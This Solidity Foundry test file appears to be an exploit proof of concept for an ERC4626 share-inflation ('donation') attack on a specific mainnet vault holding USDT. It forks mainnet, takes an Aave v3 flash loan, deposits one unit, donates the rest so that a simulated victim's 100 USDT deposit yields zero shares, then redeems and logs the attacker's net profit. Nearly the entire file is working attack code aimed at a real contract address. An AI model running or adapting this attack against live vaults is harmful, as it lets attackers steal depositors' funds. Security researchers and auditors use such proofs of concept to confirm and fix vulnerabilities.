// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Vault 0x356b (Aave v3, USDT) - Donation Attack PoC (Flash Loan)
// USDT is non-standard ERC20 (no bool return), requires low-level calls

import "../basetest.sol";
import {IERC20} from "../interface.sol";

interface IERC4626Vault is IERC20 {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress, address asset, uint256 amount,
        bytes calldata params, uint16 referralCode
    ) external;
}

contract Vault_0x356b_DonationPoC is BaseTestWithBalanceLog {
    IERC4626Vault internal constant VAULT = IERC4626Vault(0x356B8d89c1e1239Cbbb9dE4815c39A1474d5BA7D);
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    IAaveV3Pool internal constant AAVE_POOL = IAaveV3Pool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    uint256 internal constant FORK_BLOCK = 20_434_756;
    address internal constant VICTIM = address(0xbeef);

    uint256 internal constant DONATION_AMOUNT = 10_000 * 1e6; // 10K USDT
    uint256 internal constant VICTIM_DEPOSIT = 100 * 1e6;     // 100 USDT

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        fundingToken = USDT;
        vm.label(address(VAULT), "Vault");
        vm.label(USDT, "USDT");
        vm.label(address(AAVE_POOL), "AaveV3Pool");
        vm.label(VICTIM, "Victim");
        emit log_string("=== Setup ===");
        emit log_named_uint("Fork Block", FORK_BLOCK);
        emit log_named_decimal_uint("totalSupply", VAULT.totalSupply(), 6);
        emit log_named_decimal_uint("totalAssets", VAULT.totalAssets(), 6);
    }

    // USDT safe wrappers (no bool return)
    function _safeApprove(address spender, uint256 amt) internal {
        (bool s1,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", spender, uint256(0)));
        require(s1, "approve(0) failed");
        if (amt > 0) {
            (bool s2,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", spender, amt));
            require(s2, "approve failed");
        }
    }
    function _safeTransfer(address to, uint256 amt) internal {
        (bool s,) = USDT.call(abi.encodeWithSignature("transfer(address,uint256)", to, amt));
        require(s, "transfer failed");
    }

    function testDonationSensitivity() public {
        uint256 before_ = VAULT.totalAssets();
        deal(USDT, address(this), DONATION_AMOUNT);
        _safeTransfer(address(VAULT), DONATION_AMOUNT);
        uint256 after_ = VAULT.totalAssets();
        emit log_named_decimal_uint("totalAssets before", before_, 6);
        emit log_named_decimal_uint("totalAssets after", after_, 6);
        if (after_ > before_) emit log_string("[OK] BALANCE-BASED");
        else emit log_string("[INFO] INTERNAL ACCOUNTING");
    }

    function testFullAttackFlow() public balanceLog {
        emit log_string("=== ERC4626 Donation Attack via Flash Loan (USDT) ===");
        require(VAULT.totalSupply() == 0, "Vault must be empty");
        uint256 flashAmt = DONATION_AMOUNT + 1;
        emit log_named_decimal_uint("Flash Loan Amount", flashAmt, 6);
        AAVE_POOL.flashLoanSimple(address(this), USDT, flashAmt, "", 0);
        uint256 profit = IERC20(USDT).balanceOf(address(this));
        emit log_string("=== RESULT ===");
        emit log_named_decimal_uint("Net Profit", profit, 6);
        if (profit > 0) emit log_string("[PASS] ATTACK PROFITABLE!");
        else emit log_string("[INFO] Not profitable or protected");
    }

    function executeOperation(
        address, uint256 amount, uint256 premium, address, bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_POOL), "not Aave");
        uint256 repay = amount + premium;
        emit log_named_decimal_uint("Borrowed", amount, 6);
        emit log_named_decimal_uint("Fee", premium, 6);

        // Step 1: deposit 1 wei USDT
        _safeApprove(address(VAULT), 1);
        uint256 atkShares = VAULT.deposit(1, address(this));
        emit log_named_decimal_uint("Attacker shares", atkShares, 6);

        // Step 2: donate rest
        _safeTransfer(address(VAULT), amount - 1);
        emit log_named_decimal_uint("Share price/unit", VAULT.convertToAssets(1e6), 6);

        // Step 3: victim deposits
        deal(USDT, VICTIM, VICTIM_DEPOSIT);
        vm.startPrank(VICTIM);
        (bool sa,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", address(VAULT), VICTIM_DEPOSIT));
        require(sa);
        try VAULT.deposit(VICTIM_DEPOSIT, VICTIM) returns (uint256 vs) {
            vm.stopPrank();
            emit log_named_decimal_uint("Victim shares", vs, 6);
            if (vs == 0) emit log_string("[CRITICAL] Victim got 0 shares!");
            else {
                uint256 vv = VAULT.convertToAssets(vs);
                emit log_named_decimal_uint("Victim value", vv, 6);
                emit log_named_decimal_uint("Victim loss", VICTIM_DEPOSIT > vv ? VICTIM_DEPOSIT - vv : 0, 6);
            }
        } catch {
            vm.stopPrank();
            emit log_string("[INFO] Victim deposit reverted (0-share protection)");
        }

        // Step 4: attacker redeems
        uint256 redeemed = VAULT.redeem(atkShares, address(this), address(this));
        emit log_named_decimal_uint("Attacker redeemed", redeemed, 6);

        // Step 5: repay
        _safeApprove(address(AAVE_POOL), repay);
        return true;
    }
}
